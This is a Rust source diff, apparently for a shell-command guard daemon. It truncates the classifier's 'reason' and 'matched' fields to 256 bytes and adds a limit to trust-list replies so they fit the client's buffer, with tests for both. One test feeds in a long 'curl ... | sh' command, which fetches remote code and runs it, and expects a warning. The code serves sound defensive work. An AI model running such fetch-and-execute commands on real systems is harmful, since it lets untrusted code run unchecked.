@@ -550,7 +550,9 @@ fn dispatch(state: &State, req: Request, peer: PeerCred) -> ResponseBody {
             handle_session_add_url_block(state, peer, host, target_uid)
         }
         Request::TrustAdd { hash, target_uid } => handle_trust_add(state, peer, hash, target_uid),
-        Request::TrustList { target_uid } => handle_trust_list(state, peer, target_uid),
+        Request::TrustList { target_uid, limit } => {
+            handle_trust_list(state, peer, target_uid, limit)
+        }
         Request::SessionWrite { target_uid } => handle_session_write(state, peer, target_uid),
         Request::SubscribeWarnEvents { .. } => {
             // Bypass-checked in the request loop above. Dispatch
@@ -903,7 +905,34 @@ fn handle_classify(
         }
     }
 
+    // Enforce the protocol's documented 256-byte bound on `reason`
+    // (protocol.rs) and apply the same bound to `matched`: the
+    // multi-hit reason concatenates every hit and `PidHighThreat` sets
+    // `matched` to the whole command, so an attacker-influenced long
+    // command could push the wire response past the Zig client's 16 KiB
+    // read buffer → LineTooLong → silent fail-open to in-proc Tier-1.
+    truncate_to_bytes(&mut result.reason, MAX_FIELD_BYTES);
+    truncate_to_bytes(&mut result.matched, MAX_FIELD_BYTES);
     ResponseBody::Classify(result)
+}
+
+/// Byte cap for the classify `reason` / `matched` wire fields. Keeps a
+/// single classify response well under the client's read buffer
+/// regardless of command length or hit count.
+const MAX_FIELD_BYTES: usize = 256;
+
+/// Truncate `s` in place to at most `max` bytes, backing up to a UTF-8
+/// char boundary so the result is valid (advisory/command text can be
+/// arbitrary Unicode).
+fn truncate_to_bytes(s: &mut String, max: usize) {
+    if s.len() <= max {
+        return;
+    }
+    let mut end = max;
+    while !s.is_char_boundary(end) {
+        end -= 1;
+    }
+    s.truncate(end);
 }
 
 fn handle_set_threat_level(
@@ -1334,15 +1363,32 @@ fn handle_trust_add(
     }
 }
 
-fn handle_trust_list(state: &State, peer: PeerCred, target_uid: Option<u32>) -> ResponseBody {
+fn handle_trust_list(
+    state: &State,
+    peer: PeerCred,
+    target_uid: Option<u32>,
+    limit: Option<u32>,
+) -> ResponseBody {
     let uid = match resolve_target_uid(peer, target_uid) {
         Ok(u) => u,
         Err(msg) => return ResponseBody::Error { message: msg },
     };
     let _ = state.trust_store.ensure_loaded(uid);
-    ResponseBody::TrustList {
-        trust: state.trust_store.list_persistent_trust(uid),
+    // Honor the caller's `limit`: the atty proxy sets it to bound the
+    // reply to its fixed 16 KiB read buffer (each hash is ~67 bytes on
+    // the wire, so the full PERSISTENT_TRUST_CAP would be ~1.1 MB →
+    // LineTooLong → cross-shell trust seeding silently dies). The
+    // operator CLI omits it and gets the full snapshot. When the proxy
+    // caps, the over-limit commands re-prompt once and re-trust
+    // in-session (and re-mirror), so no trust is lost.
+    let mut trust = state.trust_store.list_persistent_trust(uid);
+    if let Some(n) = limit {
+        let n = n as usize;
+        if trust.len() > n {
+            trust.truncate(n);
+        }
     }
+    ResponseBody::TrustList { trust }
 }
 
 fn handle_session_write(state: &State, peer: PeerCred, target_uid: Option<u32>) -> ResponseBody {
@@ -2439,6 +2485,80 @@ mod tests {
         assert_eq!(trust.len(), 1);
         assert_eq!(trust[0], hash);
         let _ = std::fs::remove_file(socket);
+    }
+
+    #[test]
+    fn truncate_to_bytes_respects_char_boundary() {
+        let mut s = "a".repeat(300);
+        truncate_to_bytes(&mut s, 256);
+        assert_eq!(s.len(), 256);
+        // 255 'a' + 界 (3 bytes) = 258; cap 256 lands mid-界 → 255.
+        let mut s2 = format!("{}界", "a".repeat(255));
+        truncate_to_bytes(&mut s2, 256);
+        assert_eq!(s2.len(), 255);
+        let mut s3 = "short".to_string();
+        truncate_to_bytes(&mut s3, 256);
+        assert_eq!(s3, "short");
+    }
+
+    #[test]
+    fn classify_truncates_reason_and_matched() {
+        // A long curl|sh whose `matched` (the whole match) would exceed
+        // the 256-byte field cap must come back truncated, so the wire
+        // response can't blow past the client's read buffer.
+        let (socket, _h) = spawn_server();
+        let mut stream = UnixStream::connect(&socket).expect("connect");
+        let long = format!("curl https://example.com/{} | sh", "a".repeat(400));
+        let req = serde_json::json!({"id": 1, "method": "classify", "command": long}).to_string();
+        let reply = round_trip(&mut stream, &req);
+        let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
+        assert_eq!(v["verdict"], "warn");
+        assert!(
+            v["matched"].as_str().unwrap().len() <= MAX_FIELD_BYTES,
+            "matched not truncated: {}",
+            v["matched"].as_str().unwrap().len()
+        );
+        assert!(v["reason"].as_str().unwrap().len() <= MAX_FIELD_BYTES);
+        let _ = std::fs::remove_file(socket);
+    }
+
+    #[test]
+    fn trust_list_limit_caps_but_none_returns_full() {
+        extern "C" {
+            fn geteuid() -> u32;
+        }
+        let uid = unsafe { geteuid() };
+        let dir = std::env::temp_dir().join(format!("atty-guard-trustcap-{}", std::process::id()));
+        let store = Arc::new(crate::trust_store::TrustStore::new(dir.clone()));
+        let total = 250usize;
+        for i in 0..total {
+            store
+                .persistent_add_trust(uid, &format!("{i:064x}"))
+                .unwrap();
+        }
+        let (socket, _h) = spawn_server_with_trust_store(store);
+
+        // Proxy-style request WITH a limit → bounded reply that fits the
+        // proxy's 16 KiB read buffer.
+        let mut s1 = UnixStream::connect(&socket).expect("connect");
+        let capped = round_trip(&mut s1, r#"{"id":1,"method":"trust_list","limit":200}"#);
+        let v: serde_json::Value = serde_json::from_str(&capped).unwrap();
+        assert_eq!(v["type"], "trust_list");
+        assert_eq!(v["trust"].as_array().unwrap().len(), 200);
+        assert!(
+            capped.len() < 16384,
+            "capped reply must fit the 16 KiB buffer: {}",
+            capped.len()
+        );
+
+        // Operator-CLI-style request with NO limit → full snapshot.
+        let mut s2 = UnixStream::connect(&socket).expect("connect");
+        let full = round_trip(&mut s2, r#"{"id":2,"method":"trust_list"}"#);
+        let v2: serde_json::Value = serde_json::from_str(&full).unwrap();
+        assert_eq!(v2["trust"].as_array().unwrap().len(), total);
+
+        let _ = std::fs::remove_file(socket);
+        std::fs::remove_dir_all(&dir).ok();
     }
 
     #[test]
